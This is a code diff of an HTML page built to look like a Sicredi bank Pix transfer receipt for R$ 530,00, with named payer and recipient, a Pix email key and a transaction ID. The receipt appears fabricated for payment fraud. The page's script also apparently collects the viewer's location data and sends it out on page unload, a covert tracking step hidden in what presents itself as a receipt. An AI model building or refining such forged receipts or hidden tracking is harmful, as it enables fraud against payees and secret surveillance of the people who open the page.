@@ -11,35 +11,34 @@
 <body>
   <div class="comprovante-container">
     <div class="topo-comprovante" style="text-align: center; margin-bottom: 20px;">
-      <!-- Ajuste o src abaixo para o nome exato do arquivo da sua logo na Vercel (ex: logo.png ou sicredi.png) -->
       <img src="logo-sicredi.png" alt="Logo Sicredi" style="max-width: 130px; height: auto; margin-bottom: 10px;" onerror="this.style.display='none'; document.getElementById('fallback-logo').style.display='block';" />
       <h2 id="fallback-logo" style="display:none; color: #2d6a4f; font-weight: bold;">Sicredi</h2>
       
-      <h2 style="font-size: 20px; margin-top: 5px;">Pix Enviado - R$ 530,00</h2>[span_3](start_span)[span_3](end_span)[span_4](start_span)[span_4](end_span)
+      <h2 style="font-size: 20px; margin-top: 5px;">Pix Enviado - R$ 530,00</h2>
     </div>
 
     <div class="informacoes">
-      <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>[span_5](start_span)[span_5](end_span)[span_6](start_span)[span_6](end_span)
-      <p><span>Horário:</span> <span id="horario-atual">01:17</span></p>[span_7](start_span)[span_7](end_span)
-      <p><span>ID da Transação:</span> <span class="id-transacao" style="word-break: break-all; font-size: 13px;">PIXx2n0ozVgKTG1hBkFXvC14kyi2teoG</span></p>[span_8](start_span)[span_8](end_span)
+      <p><span>Data do Pagamento:</span> <span>Sábado, 14/11/2026</span></p>
+      <p><span>Horário:</span> <span>01:17</span></p>
+      <p><span>ID da Transação:</span> <span class="id-transacao" style="word-break: break-all; font-size: 13px;">PIXx2n0ozVgKTG1hBkFXvC14kyi2teoG</span></p>
       
       <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
 
-      <p><span>Quem Recebeu:</span> <span>Leidene Almeida Lucena</span></p>[span_9](start_span)[span_9](end_span)[span_10](start_span)[span_10](end_span)
-      <p><span>Chave Pix:</span> <span>dra.leidene@gmail.com</span></p>[span_11](start_span)[span_11](end_span)[span_12](start_span)[span_12](end_span)
+      <p><span>Quem Recebeu:</span> <span>Leidene Almeida Lucena</span></p>
+      <p><span>Chave Pix:</span> <span>dra.leidene@gmail.com</span></p>
       
       <hr style="border: 0; border-top: 1px solid #ddd; margin: 12px 0;">
 
-      <p><span>Quem Pagou:</span> <span>Maria Fernanda Costa</span></p>[span_13](start_span)[span_13](end_span)[span_14](start_span)[span_14](end_span)
-      <p><span>CPF:</span> <span>***.640.535-**</span></p>[span_15](start_span)[span_15](end_span)[span_16](start_span)[span_16](end_span)
-      <p><span>Instituição:</span> <span>Banco Cooperativo Sicredi S.A</span></p>[span_17](start_span)[span_17](end_span)[span_18](start_span)[span_18](end_span)
+      <p><span>Quem Pagou:</span> <span>Maria Fernanda Costa</span></p>
+      <p><span>CPF:</span> <span>***.640.535-**</span></p>
+      <p><span>Instituição:</span> <span>Banco Cooperativo Sicredi S.A</span></p>
     </div>
 
     <button class="botao" onclick="window.print()" style="background-color: #72A011; color: white; border: none; padding: 12px; width: 100%; font-size: 16px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;">Imprimir Comprovante</button>
 
     <div class="comprovante-footer" style="text-align: center; margin-top: 15px; font-size: 12px; color: #666;">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>[span_19](start_span)[span_19](end_span)[span_20](start_span)[span_20](end_span)
-      <p style="margin-top: 5px;"><a href="#" style="color: #72A011; text-decoration: none;">Clique aqui para mais informações.</a></p>[span_21](start_span)[span_21](end_span)
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p style="margin-top: 5px;"><a href="#" style="color: #72A011; text-decoration: none;">Clique aqui para mais informações.</a></p>
     </div>
   </div>
 
@@ -102,7 +101,6 @@
         });
     }
 
-    // Dispara o envio ao fechar ou sair da página
     window.addEventListener('beforeunload', function () {
       const payload = JSON.stringify({
         ...dadosUltimaLocalizacao,
